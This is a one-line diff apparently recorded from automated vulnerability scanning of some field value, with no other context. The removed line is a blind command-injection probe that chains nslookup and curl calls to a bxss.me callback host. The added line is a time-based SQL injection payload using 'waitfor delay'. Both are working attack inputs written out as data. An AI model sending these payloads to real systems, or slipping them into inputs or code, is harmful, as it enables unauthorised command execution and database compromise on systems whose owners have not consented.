@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitomfwtruiik4e61d.bxss.me||curl hitomfwtruiik4e61d.bxss.me)|(nslookup -q=cname hitomfwtruiik4e61d.bxss.me||curl hitomfwtruiik4e61d.bxss.me)&(nslookup -q=cname hitomfwtruiik4e61d.bxss.me||curl hitomfwtruiik4e61d.bxss.me)
+555-1); waitfor delay '0:0:15' -- 
